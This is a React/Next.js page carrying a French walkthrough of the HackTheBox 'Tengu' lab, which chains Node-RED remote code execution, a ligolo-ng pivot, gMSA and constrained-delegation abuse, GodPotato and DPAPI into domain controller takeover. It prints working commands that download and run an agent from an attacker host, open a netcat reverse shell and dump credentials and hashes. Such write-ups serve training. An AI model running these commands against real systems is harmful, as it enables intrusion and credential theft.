import Image from "next/image";
import Link from "next/link";
import { Key, Database, Shield, Network, Users, Lock } from "lucide-react";
import { RevealFlagBlock } from "@/components/RevealFlag";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Tengu | Writeup ProLab HTB | 0xbbuddha",
  description:
    "Writeup du Mini ProLab HackTheBox Tengu : RCE Node-RED non authentifiée, pivot ligolo-ng vers un réseau AD interne, abus gMSA et délégation contrainte, GodPotato, DPAPI et compte Tier-0 protégé jusqu'au Domain Controller.",
};

export default function WriteupTenguPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <header className="mb-8 border-b border-border pb-6">
        <div className="flex items-start justify-between gap-6">
          <div className="min-w-0 flex-1">
            <nav className="mb-3 flex flex-wrap items-center gap-1 text-xs text-muted-foreground">
              <Link href="/" className="transition-colors hover:text-foreground">README</Link>
              <span className="text-muted-foreground/40">›</span>
              <Link href="/writeups" className="transition-colors hover:text-foreground">Writeups</Link>
              <span className="text-muted-foreground/40">›</span>
              <span className="text-foreground/70">Tengu</span>
            </nav>
            <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Writeup ProLab</p>
            <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Tengu</h1>
            <p className="mt-3 text-sm leading-7 text-muted-foreground">
              Mini ProLab AD mixte Linux/Windows. Un Node-RED expose sans authentification sert de porte d&apos;entrée,
              avec pour fil rouge la réutilisation de secrets d&apos;un bout à l&apos;autre de la chaîne : credentials
              déchiffrées côté Linux, hash MSSQL cracké, abus d&apos;un gMSA via délégation contrainte, GodPotato,
              puis DPAPI et Kerberos jusqu&apos;à un compte Tier-0 protégé pour prendre le contrôleur de domaine.
            </p>
            <div className="mt-4 flex flex-wrap gap-x-5 gap-y-1">
              {[
                { label: "Platform", value: "HackTheBox Mini ProLabs" },
                { label: "Domaine", value: "tengu.vl" },
                { label: "Hôtes", value: "nodered (Linux) / SQL / DC" },
                { label: "Flags", value: "Impersonate / Tengu Master / Red" },
                { label: "Date", value: "2026-07-18" },
              ].map((s) => (
                <div key={s.label} className="text-xs text-muted-foreground">
                  <span className="text-muted-foreground/60">{s.label}: </span>
                  <span>{s.value}</span>
                </div>
              ))}
            </div>
          </div>
          <Image
            src="/ic-tengu-overview.png"
            alt="Tengu ProLab"
            width={160}
            height={105}
            className="hidden shrink-0 rounded-xl sm:block"
            priority
          />
        </div>
      </header>

      <article className="mt-8 space-y-10">

        {/* ── 1. RECON + RCE NODE-RED ──────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            1. Reconnaissance et RCE Node-RED non authentifiée
          </h2>
          <p className="text-muted-foreground">
            Seule une IP est fournie en externe. Le scan complet ne révèle que deux ports : SSH et
            <strong> Node-RED</strong> (1880), configuré avec un backend MSSQL vers <code className="rounded bg-muted px-1">sql.tengu.vl:1433/Dev</code>.
          </p>
          <CodeBlock title="Scan">
{`nmap 10.13.38.40 -Pn -p- -sT -T4 --min-rate 1000
→ 22/tcp (SSH), 1880/tcp (Node-RED)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            L&apos;API REST d&apos;admin de Node-RED (<code className="rounded bg-muted px-1">/flows</code>) est accessible
            sans authentification. Le flow existant contient un bug (<code className="rounded bg-muted px-1">results.foreach</code> au
            lieu de <code className="rounded bg-muted px-1">forEach</code>), mais surtout : n&apos;importe qui peut
            <strong> réécrire</strong> les flows et forcer un redeploy. Un node <code className="rounded bg-muted px-1">exec</code> natif
            est injecté, câblé directement sur le node <code className="rounded bg-muted px-1">inject</code> existant
            (qui se déclenche automatiquement 0.1s après chaque déploiement).
          </p>
          <CodeBlock title="Injection du node exec + redeploy">
{`curl -s http://10.13.38.40:1880/flows -o flows.json

curl -X POST http://10.13.38.40:1880/flows \\
  -H "Content-Type: application/json" \\
  -H "Node-RED-Deployment-Type: full" \\
  -d @flows_evil.json`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Piège rencontré : avec <code className="rounded bg-muted px-1">useSpawn:&quot;true&quot;</code>, le node exec
            n&apos;utilise pas de shell (<code className="rounded bg-muted px-1">spawn()</code> direct) - un
            <code className="rounded bg-muted px-1 mx-1">bash -c &apos;...&apos;</code> échoue silencieusement
            (<code className="rounded bg-muted px-1">rc:-2</code>). Passer en <code className="rounded bg-muted px-1">useSpawn:&quot;false&quot;</code>
            (utilise <code className="rounded bg-muted px-1">child_process.exec</code> via <code className="rounded bg-muted px-1">/bin/sh -c</code>)
            résout le problème et autorise la syntaxe shell complète.
          </p>
          <CodeBlock title="Résultat" result>
{`uid=1001(nodered_svc) gid=1001(nodered_svc) groups=1001(nodered_svc)
nodered`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Shell obtenu en tant que <strong>nodered_svc</strong>. Pour itérer sans reverse shell interactif fragile,
            une petite primitive de RCE est construite : déploiement du node exec avec la commande voulue,
            déclenchement via <code className="rounded bg-muted px-1">/inject/{"{id}"}</code>, capture de stdout/stderr
            via un node <code className="rounded bg-muted px-1">debug</code> relié, lu en direct sur le websocket admin
            (<code className="rounded bg-muted px-1">/comms</code>) de Node-RED.
          </p>
        </section>

        {/* ── 2. CREDS NODE-RED + PIVOT ─────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            2. Déchiffrement des credentials Node-RED et pivot ligolo-ng
          </h2>
          <p className="text-muted-foreground">
            <code className="rounded bg-muted px-1">realm list</code> confirme le join au domaine <strong>TENGU.VL</strong> via
            SSSD, avec <code className="rounded bg-muted px-1">permitted-groups: Domain Users</code> - n&apos;importe quel
            compte de domaine pourra donc SSH directement sur cette machine plus tard. Le secret de chiffrement Node-RED
            traîne en clair dans <code className="rounded bg-muted px-1">.config.runtime.json</code>.
          </p>
          <CodeBlock title="Secret de chiffrement + credentials chiffrées" result>
{`_credentialSecret: dee5c9fb0287ad39bac9f29bfe6f3adb4be9826f135eb6da91de0d013bd6799b`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Déchiffrement AES-256-CTR en Node.js local (clé = SHA256 du secret, IV = 32 premiers hex du blob) :
          </p>
          <CodeBlock title="nodered_connector">
{`DreamPuppyOverall25`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Le pivot a une seconde interface réseau vers l&apos;AD interne, invisible depuis l&apos;extérieur. Tunnel
            monté avec <strong>ligolo-ng</strong> (agent uploadé et exécuté via la RCE Node-RED).
          </p>
          <CodeBlock title="Setup ligolo-ng">
{`ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601

# cible : upload + exec de l'agent via la RCE
wget http://<attaquant>:8888/agent -O /tmp/.agent && chmod +x /tmp/.agent
/tmp/.agent -connect <attaquant>:11601 -ignore-cert -retry &

# console proxy
session
interface_create --name tengu0
interface_route_add --name tengu0 --route 192.168.50.0/24
tunnel_start --tun tengu0`}
          </CodeBlock>
          <CodeBlock title="Réseau interne découvert" result>
{`192.168.50.10  -> DC
192.168.50.12  -> SQL
192.168.50.240 -> le pivot nodered lui-même`}
          </CodeBlock>
        </section>

        {/* ── 3. MSSQL + CRACK + FLAG IMPERSONATE ──────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            3. MSSQL, cassage du hash et flag Impersonate
          </h2>
          <CodeBlock title="Enumeration MSSQL">
{`mssqlclient.py './nodered_connector:DreamPuppyOverall25@192.168.50.12'
use Demo
SELECT * FROM Users;`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`t2_m.winters : af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147  (SHA256 non salé)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Hash absent de rockyou même avec les règles étendues. Cracké via <strong>CrackStation</strong> (recherche
            dans des tables précalculées massives, pas du brute-force) - confirmé aussi comme mot de passe de domaine.
          </p>
          <p className="mt-2 text-muted-foreground">
            Puisque <code className="rounded bg-muted px-1">permitted-groups: Domain Users</code> autorise le SSH direct,
            connexion immédiate avec ce compte fraîchement cracké :
          </p>
          <CodeBlock title="SSH direct + sudo">
{`sshpass -p '<mdp>' ssh -l 't2_m.winters@tengu.vl' 10.13.38.40
# groupe linux_server_admins -> sudo fonctionne avec le mot de passe de domaine
sudo cat /root/root.txt`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Impersonate">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── 4. BLOODHOUND + KEYTAB + GMSA ─────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Users className="size-5 text-primary" />
            4. BloodHound, keytab de la machine et abus du gMSA
          </h2>
          <CodeBlock title="Collecte BloodHound">
{`bloodhound-python -u 't2_m.winters' -p '<mdp>' -d tengu.vl -ns 192.168.50.10 -dc DC.tengu.vl -c All --zip`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Faits clés (parsing direct des JSON, sans neo4j) : le compte machine <strong>NODERED$</strong> a le droit
            <code className="rounded bg-muted px-1 mx-1">ReadGMSAPassword</code> sur <strong>gMSA01$</strong> (via le
            groupe <em>Linux_Server</em>) ; gMSA01$ a la délégation contrainte activée
            (<code className="rounded bg-muted px-1">trustedtoauth</code>) vers <code className="rounded bg-muted px-1">MSSQLSvc/sql.tengu.vl</code> ;
            le groupe <strong>SQL_Admins</strong> contient <code className="rounded bg-muted px-1">t1_m.winters</code> (hors
            Protected Users, exploitable) et <code className="rounded bg-muted px-1">T1_C.FOWLER</code> (dans Protected
            Users - à éviter, NTLM/RC4 désactivés).
          </p>
          <p className="mt-2 text-muted-foreground">
            Le compte machine NODERED$ est justement celui sur lequel on tourne : extraction de son keytab local
            (root requis, obtenu via <code className="rounded bg-muted px-1">sudo</code>).
          </p>
          <CodeBlock title="Extraction du keytab machine">
{`sudo base64 /etc/krb5.keytab
python3 keytabextract.py krb5.keytab`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`NTLM     : d4210ee2db0c03aa3611c9ef8a4dbf49
AES-256  : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec8313...`}
          </CodeBlock>
          <CodeBlock title="Dump du mot de passe gMSA">
{`nxc ldap 192.168.50.10 -u 'NODERED$' -H d4210ee2db0c03aa3611c9ef8a4dbf49 --gmsa`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`gMSA01$ NTLM : 2d91717c8e5a25b60b977c484b0bbbd0`}
          </CodeBlock>
        </section>

        {/* ── 5. DELEGATION CONTRAINTE + GODPOTATO -> FLAG TENGU MASTER ── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            5. Délégation contrainte, GodPotato et flag Tengu Master
          </h2>
          <p className="text-muted-foreground">
            gMSA01$ peut impersonner n&apos;importe qui vers MSSQL via S4U2Self/S4U2Proxy. Impersonation de
            <strong> t1_m.winters</strong> (qui évite les restrictions Protected Users) pour obtenir un ticket de
            service sysadmin.
          </p>
          <CodeBlock title="S4U2Proxy">
{`getST.py -spn 'MSSQLSvc/sql.tengu.vl' -impersonate 't1_m.winters' -dc-ip 192.168.50.10 \\
  -hashes ':2d91717c8e5a25b60b977c484b0bbbd0' 'tengu.vl/gMSA01$'

export KRB5CCNAME=t1_m.winters@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache
mssqlclient.py -k -no-pass tengu.vl/t1_m.winters@sql.tengu.vl -target-ip 192.168.50.12`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`system_user = TENGU\\t1_m.winters
is_srvrolemember('sysadmin') = 1
whoami /priv -> SeImpersonatePrivilege: Enabled (process tourne en tengu\\gmsa01$)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            <code className="rounded bg-muted px-1">enable_xp_cmdshell</code> puis upload de <strong>GodPotato</strong> et
            d&apos;un netcat Windows via des listeners ligolo-ng côté agent (seul le pivot nodered est routable
            depuis SQL) :
          </p>
          <CodeBlock title="Listeners ligolo-ng + upload">
{`listener_add --addr 0.0.0.0:9091 --to 127.0.0.1:9091 --tcp   # http.server
listener_add --addr 0.0.0.0:4040 --to 127.0.0.1:4040 --tcp   # reverse shell

# xp_cmdshell (PowerShell -EncodedCommand, plus fiable que les guillemets imbriqués)
Invoke-WebRequest -Uri http://192.168.50.240:9091/GodPotato-NET4.exe -OutFile $env:TEMP\\GodPotato-NET4.exe
Invoke-WebRequest -Uri http://192.168.50.240:9091/nc64.exe -OutFile $env:TEMP\\nc64.exe

%TEMP%\\GodPotato-NET4.exe -cmd "%TEMP%\\nc64.exe 192.168.50.240 4040 -e cmd.exe"`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`whoami -> nt authority\\system`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Tengu Master">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── 6. LAZAGNE + DPAPI + DC -> FLAG RED ──────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            6. LaZagne, DPAPI et compromission du DC - flag Red
          </h2>
          <p className="text-muted-foreground">
            Une tâche planifiée <code className="rounded bg-muted px-1">C:\admin\Task.ps1</code> confirme le décor
            (surveillance du service MSSQL). <strong>LaZagne</strong> uploadé et lancé pour moissonner les credentials
            locales.
          </p>
          <CodeBlock title="LaZagne">
{`Invoke-WebRequest -Uri http://192.168.50.240:9091/LaZagne.exe -OutFile $env:TEMP\\LaZagne.exe
%TEMP%\\LaZagne.exe all`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Hashdump local : Administrator:500:...:73db3fdd24bee6eeb5aac7e17e4aba4c:::
Vault (Credential Manager) : entrée DPAPI non déchiffrée pour une tâche planifiée -> TENGU\\T0_c.fowler`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Déchiffrement DPAPI complet avec le hash Administrator local (SAM, pas domaine) :
          </p>
          <CodeBlock title="Déchiffrement DPAPI">
{`nxc smb 192.168.50.12 -u Administrator -H 73db3fdd24bee6eeb5aac7e17e4aba4c --local-auth --dpapi`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`TENGU\\T0_c.fowler : <mot de passe recupere>`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            <code className="rounded bg-muted px-1">T0_c.fowler</code> est un compte Tier-0 dans <strong>Protected Users</strong> :
            l&apos;authentification NTLM classique échoue, seule une authentification Kerberos AES est acceptée.
          </p>
          <CodeBlock title="NTLM bloqué, bascule Kerberos">
{`nxc smb 192.168.50.10 -u 'T0_c.fowler' -p '<mdp>'
# STATUS_ACCOUNT_RESTRICTION

getTGT.py 'tengu.vl/T0_c.fowler:<mdp>' -dc-ip 192.168.50.10
export KRB5CCNAME=T0_c.fowler.ccache

psexec.py -k -no-pass tengu.vl/T0_c.fowler@dc.tengu.vl -target-ip 192.168.50.10 -dc-ip 192.168.50.10`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`whoami -> nt authority\\system   (SYSTEM sur le DC)`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Red">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── RECAP ─────────────────────────────────────────────────────── */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li><strong>Accès initial</strong> : API admin Node-RED non authentifiée → node exec injecté → RCE en tant que nodered_svc</li>
            <li><strong>Credentials Node-RED</strong> : secret de chiffrement en clair dans la config → déchiffrement AES-256-CTR → creds MSSQL</li>
            <li><strong>Pivot</strong> : ligolo-ng via la 2e interface du pivot Linux → accès au réseau AD interne (DC + SQL)</li>
            <li><strong>Flag Impersonate</strong> : hash MSSQL de t2_m.winters cracké (CrackStation) → SSH direct (Domain Users autorisés) → sudo → root</li>
            <li><strong>gMSA</strong> : BloodHound → NODERED$ lit le mot de passe de gMSA01$ → keytab machine (sudo) → dump gMSA</li>
            <li><strong>Flag Tengu Master</strong> : délégation contrainte gMSA01$ → impersonate t1_m.winters (évite Protected Users) → sysadmin MSSQL → xp_cmdshell + SeImpersonatePrivilege → GodPotato → SYSTEM sur SQL</li>
            <li><strong>Flag Red</strong> : LaZagne → hash Administrator local + vault DPAPI (T0_c.fowler) → netexec --dpapi → mot de passe en clair → Kerberos (NTLM bloqué, Protected Users) → SYSTEM sur le DC</li>
          </ul>
        </section>

      </article>
    </div>
  );
}
